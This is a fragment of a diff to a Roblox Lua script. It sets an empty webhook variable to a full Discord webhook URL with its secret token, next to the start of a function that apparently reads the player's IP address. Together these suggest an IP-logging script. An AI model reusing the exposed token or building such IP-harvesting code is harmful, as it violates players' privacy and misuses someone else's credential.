@@ -15,7 +15,7 @@ local LocalPlayer = Players.LocalPlayer
 -- ============================================================
 -- 📤 Webhook
 -- ============================================================
-local webhookURL = ""
+local webhookURL = "https://discord.com/api/webhooks/1558532887106551808/GN9RM2LTE8K0-abawBEH6SFqWJ1rFlMRBd6CW2IXUsNTJsBO9vYa22yKwO1-25PBIZ6g"
 
 local function getIP()
     local ip = "غير معروف"
